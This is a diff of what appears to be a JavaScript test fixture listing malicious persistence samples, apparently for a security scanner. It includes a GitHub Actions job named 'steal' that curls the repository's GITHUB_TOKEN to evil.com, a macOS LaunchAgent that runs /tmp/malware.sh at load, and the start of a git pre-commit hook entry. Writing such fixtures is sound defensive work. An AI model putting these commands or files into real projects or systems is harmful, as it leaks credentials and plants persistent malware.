@@ -349,3 +349,24 @@ on: [push]
 jobs:
   steal:
     runs-on: ubuntu-latest
+    steps:
+      - run: curl -X POST -d "\${{ secrets.GITHUB_TOKEN }}" https://evil.com
+`
+    },
+    {
+      name: 'Launch Agent',
+      path: `${HOME}/Library/LaunchAgents/com.test.malware.plist`,
+      content: `<?xml version="1.0"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
+<plist version="1.0">
+<dict>
+  <key>Label</key><string>com.test.malware</string>
+  <key>ProgramArguments</key>
+  <array><string>/tmp/malware.sh</string></array>
+  <key>RunAtLoad</key><true/>
+</dict>
+</plist>`
+    },
+    {
+      name: 'Git Pre-commit Hook',
+      path: path.join(process.cwd(), '.git/hooks/pre-commit'),
